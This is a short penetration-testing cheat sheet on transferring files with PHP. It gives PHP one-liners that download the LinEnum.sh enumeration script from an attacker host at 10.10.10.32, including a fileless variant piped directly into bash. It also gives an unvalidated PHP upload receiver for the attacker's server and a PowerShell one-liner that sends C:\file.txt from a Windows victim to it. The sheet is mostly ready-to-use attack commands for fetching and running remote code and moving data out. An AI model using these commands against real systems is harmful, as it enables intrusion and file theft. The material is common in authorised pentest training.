# PHP File Transfers

## Web Server

```bash
php -S 0.0.0.0:8000
```

---

## Download One-Liners

```bash
# file_get_contents
php -r '$file = file_get_contents("http://10.10.10.32/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

# fopen (buffered)
php -r 'const BUFFER = 1024; $fremote = fopen("http://10.10.10.32/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Fileless (pipe to bash)
php -r '$lines = @file("http://10.10.10.32/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

---

## PHP Upload Receiver

Save as `/var/www/upload.php` on attacker:

```php
<?php
$uploaddir = '/var/www/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

Upload from Windows via PowerShell:

```powershell
(New-Object System.Net.WebClient).UploadFile('http://10.10.10.32/upload.php', 'C:\file.txt')
```
